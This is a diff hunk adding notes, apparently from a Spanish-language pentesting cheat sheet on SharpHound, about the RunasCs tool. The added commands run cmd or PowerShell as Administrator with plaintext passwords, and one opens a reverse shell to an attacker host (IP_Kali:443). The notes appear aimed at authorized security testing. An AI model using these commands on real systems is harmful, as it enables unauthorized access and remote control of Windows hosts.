@@ -154,6 +154,21 @@ Notas:
 
 ## SharpHound desde un CMD en Windows 
 
+* [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)
+
+```powershell 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe"
+# Ejecutar una reverse shell a Kali 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe" -r IP_Kali:443 
+
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" 
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" -l 9
+	# -l 9 = Mismo comportamiento que '/netonly'
+
+# Ejecutar un comando 
+❯ .\RunasCs.exe corp\administrator Password123 "cmd.exe /c whoami"
+```
+
 ```bash 
 # Autenticarse en un 'CMD' en Windows con credenciales validas
 ❯ runas /netonly /user:domain1.com\username cmd    # Autenticarse con credenciales validas a nivel de red en una CMD en Windows> Este comando abrirá una nueva CMD con las credenciales 
